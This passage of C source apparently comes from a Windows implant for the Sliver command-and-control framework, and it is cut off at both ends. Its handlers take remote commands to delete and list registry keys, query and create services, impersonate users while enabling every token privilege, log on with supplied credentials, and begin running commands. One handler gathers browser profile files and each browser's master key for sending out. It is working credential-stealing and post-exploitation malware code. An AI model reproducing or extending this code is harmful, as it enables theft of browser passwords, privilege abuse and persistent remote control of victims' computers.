	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_QUERY_VALUE, &hKey);
	if (Status == ERROR_SUCCESS) {
		lpKeyName = lpValueName;
		lpValueName = NULL;
	}
	else if (Status != ERROR_FILE_NOT_FOUND) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	RegCloseKey(hKey);
	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	if (lpValueName == NULL) {
		Status = RegDeleteKeyA(hKey, lpKeyName);
		if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegDeleteKeyA", Status);
			goto CLEANUP;
		}
	}
	else {
		Status = RegDeleteValueA(hKey, lpValueName);
		if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegDeleteValueA", Status);
			goto CLEANUP;
		}
	}

	pFinalElement = CreateStructElement(NULL, 0, 9);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshaledData[i]);
		}

		FREE(UnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	FREE(lpPath);
	FREE(lpHive);
	FREE(lpValueName);
	FREE(lpKeyName);
	FREE(lpTemp);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE RegistrySubKeysListHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[2];
	PBUFFER* pSubKeys = NULL;
	DWORD i = 0;
	PBUFFER* UnmarshaledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	PPBElement pFinalElement = NULL;
	DWORD cSubKeys = 0;
	DWORD dwMaxSubKeyLength = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshaledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshaledData[1]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &cSubKeys, &dwMaxSubKeyLength, NULL, NULL, NULL, NULL, NULL, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegQueryInfoKeyA", Status);
		goto CLEANUP;
	}

	pSubKeys = ALLOC(sizeof(PBUFFER) * cSubKeys);
	for (i = 0; i < cSubKeys; i++) {
		pSubKeys[i] = BufferEmpty(dwMaxSubKeyLength + 1);
		Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
		if (Status == ERROR_MORE_DATA) {
			pSubKeys[i]->cbBuffer += 1;
			pSubKeys[i]->pBuffer = REALLOC(pSubKeys[i]->pBuffer, pSubKeys[i]->cbBuffer);
			Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
			if (Status != ERROR_SUCCESS) {
				LOG_ERROR("RegEnumKeyExA", Status);
				goto CLEANUP;
			}
		}
		else if (Status == ERROR_NO_MORE_ITEMS) {
			break;
		}
		else if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegEnumKeyExA", Status);
			goto CLEANUP;
		}

		pSubKeys[i]->cbBuffer = lstrlenA(pSubKeys[i]->pBuffer);
	}

	pFinalElement = CreateRepeatedBytesElement(pSubKeys, i, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshaledData[i]);
			FREE(RecvElementList[i]);
		}

		FREE(UnmarshaledData);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	FREE(lpPath);
	FREE(lpHive);
	if (pSubKeys != NULL) {
		for (i = 0; i < cSubKeys; i++) {
			FreeBuffer(pSubKeys[i]);
		}

		FREE(pSubKeys);
	}

	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE RegistryListValuesHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[2];
	PBUFFER* pValues = NULL;
	DWORD i = 0;
	PBUFFER* UnmarshaledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	PPBElement pFinalElement = NULL;
	DWORD cValues = 0;
	DWORD dwMaxValueNameLength = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshaledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshaledData[1]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &cValues, &dwMaxValueNameLength, NULL, NULL, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegQueryInfoKeyA", Status);
		goto CLEANUP;
	}

	pValues = ALLOC(sizeof(PBUFFER) * cValues);
	for (i = 0; i < cValues; i++) {
		pValues[i] = BufferEmpty(dwMaxValueNameLength + 1);
		Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
		if (Status == ERROR_MORE_DATA) {
			pValues[i]->cbBuffer += 1;
			pValues[i]->pBuffer = REALLOC(pValues[i]->pBuffer, pValues[i]->cbBuffer);
			Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
			if (Status != ERROR_SUCCESS) {
				LOG_ERROR("RegEnumKeyExA", Status);
				goto CLEANUP;
			}
		}
		else if (Status == ERROR_NO_MORE_ITEMS) {
			break;
		}
		else if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegEnumKeyExA", Status);
			goto CLEANUP;
		}

		pValues[i]->cbBuffer = lstrlenA(pValues[i]->pBuffer);
	}

	pFinalElement = CreateRepeatedBytesElement(pValues, i, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshaledData[i]);
		}

		FREE(UnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	FREE(lpPath);
	FREE(lpHive);
	if (pValues != NULL) {
		for (i = 0; i < cValues; i++) {
			FreeBuffer(pValues[i]);
		}

		FREE(pValues);
	}

	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE ServiceDetailHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement ServiceDetails[7];
	PPBElement pFinalElement = NULL;
	PBUFFER** pServiceInfoReq = NULL;
	PPBElement pRecvElement;
	SC_HANDLE hService = NULL;
	DWORD i = 0;
	SC_HANDLE hScManager = NULL;
	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
	DWORD dwBytesNeeded = 0;
	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
	PPBElement RecvElementList[2];
	LPSTR lpServiceName = NULL;
	DWORD cchServiceDisplayName = 0;
	LPSTR lpServiceDisplayName = NULL;
	SERVICE_STATUS ServiceStatus;

	SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = StructType;
	pRecvElement->dwFieldIdx = 1;
	pRecvElement->SubElements = ALLOC(sizeof(PPBElement) * 2);
	pRecvElement->dwNumberOfSubElement = 2;
	for (i = 0; i < pRecvElement->dwNumberOfSubElement; i++) {
		pRecvElement->SubElements[i] = ALLOC(sizeof(PBElement));
		pRecvElement->SubElements[i]->Type = Bytes;
		pRecvElement->SubElements[i]->dwFieldIdx = i + 1;
	}

	pServiceInfoReq = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
	if (hScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
	if (hService == NULL) {
		LOG_ERROR("OpenServiceA", GetLastError());
		goto CLEANUP;
	}

	ServiceDetails[0] = CreateBytesElement(lpServiceName, lstrlenA(lpServiceName), 1);
	GetServiceDisplayNameA(hScManager, lpServiceName, NULL, &cchServiceDisplayName);
	cchServiceDisplayName++;
	lpServiceDisplayName = ALLOC(cchServiceDisplayName);
	if (!GetServiceDisplayNameA(hScManager, lpServiceName, lpServiceDisplayName, &cchServiceDisplayName)) {
		LOG_ERROR("GetServiceDisplayNameA", GetLastError());
		goto CLEANUP;
	}

	ServiceDetails[1] = CreateBytesElement(lpServiceDisplayName, lstrlenA(lpServiceDisplayName), 2);
	QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, NULL, 0, &dwBytesNeeded);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		lpServiceDesc = ALLOC(dwBytesNeeded + 1);
		if (QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, lpServiceDesc, dwBytesNeeded, &dwBytesNeeded)) {
			for (i = 0; i < lstrlenA(lpServiceDesc->lpDescription); i++) {
				if (lpServiceDesc->lpDescription[i] >= 0x80) {
					lpServiceDesc->lpDescription[i] = ' ';
				}
			}

			ServiceDetails[2] = CreateBytesElement(lpServiceDesc->lpDescription, lstrlenA(lpServiceDesc->lpDescription), 3);
		}
	}

	SecureZeroMemory(&ServiceStatus, sizeof(ServiceStatus));
	if (!QueryServiceStatus(hService, &ServiceStatus)) {
		LOG_ERROR("QueryServiceStatus", GetLastError());
		goto CLEANUP;
	}

	ServiceDetails[3] = CreateVarIntElement(ServiceStatus.dwCurrentState, 4);
	QueryServiceConfigA(hService, NULL, 0, &dwBytesNeeded);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		pServiceConfig = ALLOC(dwBytesNeeded + 1);
		if (QueryServiceConfigA(hService, pServiceConfig, dwBytesNeeded, &dwBytesNeeded)) {
			ServiceDetails[4] = CreateVarIntElement(pServiceConfig->dwStartType, 5);
			ServiceDetails[5] = CreateBytesElement(pServiceConfig->lpBinaryPathName, lstrlenA(pServiceConfig->lpBinaryPathName), 6);
			ServiceDetails[6] = CreateBytesElement(pServiceConfig->lpServiceStartName, lstrlenA(pServiceConfig->lpServiceStartName), 7);
		}
	}

	pFinalElement = CreateStructElement(ServiceDetails, _countof(ServiceDetails), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;

CLEANUP:
	FREE(lpServiceName);
	FreeElement(pRecvElement);
	if (pServiceInfoReq != NULL) {
		FreeBuffer(pServiceInfoReq[0][0]);
		FreeBuffer(pServiceInfoReq[0][1]);
		FREE(pServiceInfoReq[0]);
		FREE(pServiceInfoReq);
	}

	FREE(lpServiceDesc);
	FREE(pServiceConfig);
	if (hScManager != NULL) {
		CloseServiceHandle(hScManager);
	}

	FREE(lpServiceDisplayName);
	if (hService != NULL) {
		CloseServiceHandle(hService);
	}

	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE BrowserHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PUSER_DATA* pUserDatas = NULL;
	DWORD dwNumberOfUserDatas = 0;
	PENVELOPE pResult = NULL;
	DWORD i = 0;
	DWORD j = 0;
	DWORD k = 0;
	PPBElement pFinalElement = NULL;
	PPBElement ItemType[2];
	PPBElement ProfileInfo[4];
	PUSER_DATA pUserData = NULL;
	PPROFILE_INFO pProfile = NULL;
	LPSTR lpTemp = NULL;
	PPBElement* pItemList = NULL;
	PPBElement* pProfileList = NULL;
	DWORD dwNumberOfItems = 0;
	DWORD dwNumberOfProfiles = 0;
	PBYTE pItemFileData = NULL;
	DWORD cbItemFileData = 0;
	/*
	{
		type int64
		fileData byte
	}

	string browser_name
	string profile_name
	itemData[] items
	byte masterkey
	*/

	pUserDatas = PickBrowsers(&dwNumberOfUserDatas);
	if (pUserDatas == NULL || dwNumberOfUserDatas == 0) {
		goto CLEANUP;
	}

	for (i = 0; i < dwNumberOfUserDatas; i++) {
		pUserData = pUserDatas[i];
		dwNumberOfProfiles += pUserData->cProfile;
	}

	pProfileList = ALLOC(sizeof(PPBElement) * dwNumberOfProfiles);
	dwNumberOfProfiles = 0;
	for (i = 0; i < dwNumberOfUserDatas; i++) {
		pUserData = pUserDatas[i];
		for (j = 0; j < pUserData->cProfile; j++) {
			pProfile = pUserData->ProfileList[j];
			SecureZeroMemory(ProfileInfo, sizeof(ProfileInfo));

			lpTemp = ConvertWcharToChar(pUserData->lpBrowserName);
			ProfileInfo[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			FREE(lpTemp);

			lpTemp = ConvertWcharToChar(pProfile->lpProfileName);
			ProfileInfo[1] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 2);
			FREE(lpTemp);

			ProfileInfo[3] = CreateBytesElement(pUserData->pMasterKey, pUserData->cbMasterKey, 4);
			pItemList = ALLOC(sizeof(PPBElement) * ProfileItemEnd);
			dwNumberOfItems = 0;
			for (k = 0; k < ProfileItemEnd; k++) {
				if (pProfile->ItemPaths[k] != NULL) {
					cbItemFileData = 0;
					wprintf(L"Profile: %lls; Item: %lls\n", pProfile->lpProfileName, pProfile->ItemPaths[k]);
					pItemFileData = ReadFromFile(pProfile->ItemPaths[k], &cbItemFileData);
					if (pItemFileData != NULL && cbItemFileData > 0) {
						ItemType[0] = CreateVarIntElement(k, 1);
						ItemType[1] = CreateBytesElement(pItemFileData, cbItemFileData, 2);

						pItemList[dwNumberOfItems++] = CreateStructElement(ItemType, _countof(ItemType), 0);
					}

					FREE(pItemFileData);
				}
			}

			ProfileInfo[2] = CreateRepeatedStructElement(pItemList, dwNumberOfItems, 3);
			FREE(pItemList);

			pProfileList[dwNumberOfProfiles++] = CreateStructElement(ProfileInfo, _countof(ProfileInfo), 0);
		}
	}

	pFinalElement = CreateRepeatedStructElement(pProfileList, dwNumberOfProfiles, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	if (pEnvelope != NULL) {
		pResult->uID = pEnvelope->uID;
	}

	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FreeElement(pFinalElement);
	for (i = 0; i < dwNumberOfUserDatas; i++) {
		FreeUserData(pUserDatas[i]);
	}

	FREE(pUserDatas);
	FREE(pProfileList);

	return pResult;
}

#ifdef _FULL
PENVELOPE RevToSelfHandler
(
	_In_ PENVELOPE pEnvelope,
	_In_ LPVOID pSliverClient
)
{
	PENVELOPE pResult = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;
	PGLOBAL_CONFIG pConfig = NULL;

	if (!RevertToSelf()) {
		LOG_ERROR("RevertToSelf", GetLastError());
		goto CLEANUP;
	}

	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
	pConfig = pSession->pGlobalConfig;
	pConfig->hCurrentToken = GetCurrentProcessToken();
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	return pResult;
}

PENVELOPE ImpersonateHandler
(
	_In_ PENVELOPE pEnvelope,
	_In_ LPVOID pSliverClient
)
{
	PBUFFER* pUmarshaledData = NULL;
	PPBElement ReqElement = NULL;
	LPSTR lpUserName = NULL;
	PENVELOPE pResult = NULL;
	HANDLE hNewToken = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;
	PGLOBAL_CONFIG pConfig = NULL;
	LUID Luid;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	PLUID_AND_ATTRIBUTES pPrivilege = NULL;
	BOOL IsOk = FALSE;
	DWORD i = 0;
	CHAR szPrivilegeName[0x80];
	TOKEN_PRIVILEGES TokenPriv;
	DWORD cbPrivilegeName = 0;

	ReqElement = ALLOC(sizeof(PBElement));
	ReqElement->dwFieldIdx = 1;
	ReqElement->Type = Bytes;

	pUmarshaledData = UnmarshalStruct(&ReqElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pUmarshaledData == NULL || pUmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpUserName = DuplicateStrA(((PBUFFER)pUmarshaledData[0])->pBuffer, 0);
	hNewToken = ImpersonateUser(lpUserName);
	if (hNewToken == NULL) {
		goto CLEANUP;
	}

	pTokenPrivileges = GetTokenPrivileges(hNewToken);
	if (pTokenPrivileges == NULL) {
		goto CLEANUP;
	}

	for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
		SecureZeroMemory(szPrivilegeName, sizeof(szPrivilegeName));
		SecureZeroMemory(&TokenPriv, sizeof(TokenPriv));
		pPrivilege = &pTokenPrivileges->Privileges[i];
		cbPrivilegeName = _countof(szPrivilegeName);
		if (!LookupPrivilegeNameA(NULL, &pPrivilege->Luid, szPrivilegeName, &cbPrivilegeName)) {
			LOG_ERROR("LookupPrivilegeNameA", GetLastError());
			continue;
		}

		if (!LookupPrivilegeValueA(NULL, szPrivilegeName, &TokenPriv.Privileges[0].Luid)) {
			LOG_ERROR("LookupPrivilegeValueA", GetLastError());
			continue;
		}
		
		TokenPriv.PrivilegeCount = 1;
		TokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hNewToken, FALSE, &TokenPriv, 0, NULL, NULL)) {
			LOG_ERROR("AdjustTokenPrivileges", GetLastError());
			continue;
		}
	}

	IsOk = TRUE;
	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
	pConfig = pSession->pGlobalConfig;
	pConfig->hCurrentToken = hNewToken;
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	FREE(ReqElement);
	if (!IsOk && hNewToken != NULL) {
		RevertToSelf();
		CloseHandle(hNewToken);
	}
	if (pUmarshaledData != NULL) {
		FREE(pUmarshaledData[0]);
		FREE(pUmarshaledData);
	}

	FREE(pTokenPrivileges);
	FREE(lpUserName);
	return pResult;
}

PENVELOPE MakeTokenHandler
(
	_In_ PENVELOPE pEnvelope,
	_In_ LPVOID pSliverClient
)
{
	PPBElement ReqElements[4];
	LPVOID* pUnmarshaledData = NULL;
	PENVELOPE pResult = NULL;
	LPWSTR lpUserName = NULL;
	LPWSTR lpDomain = NULL;
	LPWSTR lpPassword = NULL;
	DWORD dwLogonType = LOGON32_LOGON_NEW_CREDENTIALS;
	DWORD dwLogonProvider = LOGON32_PROVIDER_DEFAULT;
	DWORD i = 0;
	HANDLE hToken = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;
	PGLOBAL_CONFIG pConfig = NULL;
	BOOL IsOk = FALSE;

	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->Type = Bytes;
		ReqElements[i]->dwFieldIdx = i + 1;
	}

	ReqElements[3]->Type = Varint;
	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL || pUnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

	lpUserName = ConvertCharToWchar(((PBUFFER)pUnmarshaledData[0])->pBuffer);
	lpPassword = ConvertCharToWchar(((PBUFFER)pUnmarshaledData[1])->pBuffer);
	if (pUnmarshaledData[2] != NULL) {
		lpDomain = ConvertCharToWchar(((PBUFFER)pUnmarshaledData[2])->pBuffer);
	}

	if (pUnmarshaledData[3] != NULL) {
		dwLogonType = (DWORD)pUnmarshaledData[3];
	}

	if (dwLogonType == LOGON32_LOGON_NEW_CREDENTIALS) {
		dwLogonProvider = LOGON32_PROVIDER_WINNT50;
	}

	if (!LogonUserW(lpUserName, lpDomain, lpPassword, dwLogonType, dwLogonProvider, &hToken)) {
		LOG_ERROR("LogonUserW", GetLastError());
		goto CLEANUP;
	}

	if (!ImpersonateLoggedOnUser(hToken)) {
		LOG_ERROR("ImpersonateLoggedOnUser", GetLastError());
		goto CLEANUP;
	}

	IsOk = TRUE;
	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
	pConfig = pSession->pGlobalConfig;
	pConfig->hCurrentToken = hToken;
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	if (!IsOk && hToken != NULL) {
		CloseHandle(hToken);
	}

	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
	}

	if (pUnmarshaledData != NULL) {
		FREE(pUnmarshaledData[0]);
		FREE(pUnmarshaledData[1]);
		FREE(pUnmarshaledData[2]);
		FREE(pUnmarshaledData);
	}

	FREE(lpUserName);
	FREE(lpPassword);

	return pResult;
}

PENVELOPE CreateServiceHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ReqElements[7];
	LPVOID* pUnmarshaledData = NULL;
	PENVELOPE pResult = NULL;
	DWORD i = 0;
	LPSTR lpServiceName = NULL;
	LPSTR lpServiceDesc = NULL;
	LPSTR lpBinPath = NULL;
	LPSTR lpHostname = NULL;
	LPSTR lpDisplayName = NULL;
	DWORD dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	DWORD dwStartType = SERVICE_AUTO_START;
	SC_HANDLE ScManager = NULL;
	SC_HANDLE ServiceHandle = NULL;

	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->Type = Bytes;
		ReqElements[i]->dwFieldIdx = i + 1;
	}

	ReqElements[5]->Type = Varint;
	ReqElements[6]->Type = Varint;
	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL || pUnmarshaledData[2] == NULL) {
		goto CLEANUP;
	}

	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
	lpBinPath = DuplicateStrA(((PBUFFER)pUnmarshaledData[2])->pBuffer, 0);
	if (pUnmarshaledData[1] != NULL) {
		lpServiceDesc = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
	}
	
	if (pUnmarshaledData[3] != NULL) {
		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[3])->pBuffer, 0);
	}

	if (pUnmarshaledData[4] != NULL) {
		lpDisplayName = DuplicateStrA(((PBUFFER)pUnmarshaledData[4])->pBuffer, 0);
	}

	if (pUnmarshaledData[5] != NULL) {
		dwServiceType = (DWORD)pUnmarshaledData[5];
	}

	if (pUnmarshaledData[6] != NULL) {
		dwStartType = (DWORD)pUnmarshaledData[6];
	}

	ScManager = OpenSCManagerA(lpHostname, NULL, SC_MANAGER_ALL_ACCESS);
	if (ScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	ServiceHandle = CreateServiceA(ScManager, lpServiceName, lpDisplayName, SERVICE_ALL_ACCESS, dwServiceType, dwStartType, SERVICE_ERROR_NORMAL, lpBinPath, NULL, NULL, NULL, NULL, NULL);
	if (ServiceHandle == NULL) {
		LOG_ERROR("CreateServiceA", GetLastError());
		goto CLEANUP;
	}
	
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	if (ServiceHandle != NULL) {
		CloseServiceHandle(ServiceHandle);
	}

	if (ScManager != NULL) {
		CloseServiceHandle(ScManager);
	}

	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
	}

	if (pUnmarshaledData != NULL) {
		for (i = 0; i < 5; i++) {
			FREE(pUnmarshaledData[i]);
		}

		FREE(pUnmarshaledData);
	}

	FREE(lpServiceName);
	FREE(lpServiceDesc);
	FREE(lpBinPath);
	FREE(lpHostname);
	FREE(lpDisplayName);

	return pResult;
}

PENVELOPE CmdHandler
(
	_In_ PENVELOPE pEnvelope,
	_In_ LPVOID lpSliverClient
)
{
	PPBElement pCmdElements[3];
	PPBElement RespElements[2];
	PPBElement pFinalElement = NULL;
	DWORD i = 0;
	PENVELOPE pResult = NULL;
	LPVOID* UnmarshaledData = NULL;
	LPSTR lpCommand = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;
	PGLOBAL_CONFIG pConfig = NULL;
	LPWSTR lpInputPath = NULL;
	LPWSTR lpErrorPath = NULL;
	LPWSTR lpOutputPath = NULL;
	PBYTE pOutputData = NULL;
	DWORD cbOutputData = 0;
	PBYTE pErrorData = NULL;
	DWORD cbErrorData = 0;
	BOOL ExecuteNow = FALSE;
	WCHAR wszOobePath[MAX_PATH];
	LPWSTR lpOobeldrPath = NULL;
	DWORD dwTimeout = 360;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	DWORD dwPidOfOobeldr = 0;
	BOOL SaveOutput = FALSE;
	WCHAR wszTempPath[MAX_PATH];
	LPWSTR lpTemp1 = NULL;
	LPSTR lpTemp2 = NULL;

	SecureZeroMemory(RespElements, sizeof(RespElements));
	for (i = 0; i < _countof(pCmdElements); i++) {
		pCmdElements[i] = ALLOC(sizeof(PBElement));
